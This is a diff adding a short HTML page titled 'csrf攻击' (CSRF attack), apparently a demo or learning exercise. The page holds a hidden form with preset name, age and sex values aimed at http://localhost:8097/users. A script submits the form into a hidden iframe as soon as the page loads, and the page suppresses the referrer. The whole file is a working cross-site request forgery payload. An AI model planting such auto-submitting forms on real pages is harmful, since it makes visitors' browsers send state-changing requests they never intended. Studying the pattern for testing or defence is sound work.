@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset=utf-8>
+  <meta name="referrer" content="never">
+  <title>csrf攻击</title>
+</head>
+<body>
+  <div>
+      嘻嘻嘻
+    <form method="post" action="http://localhost:8097/users" target="localwindow" id="formId">
+      <input type="hidden" name="name" value="11"/>
+      <input type="hidden" name="age" value="30" />
+      <input type="hidden" name="sex" value="1" />
+    </form>
+    <iframe style="display:none;" name="localwindow"></iframe>
+  </div>
+
+  <script type="text/javascript">
+    var f = document.getElementById('formId');
+    f.submit();
+  </script>
+</body>
+</html>
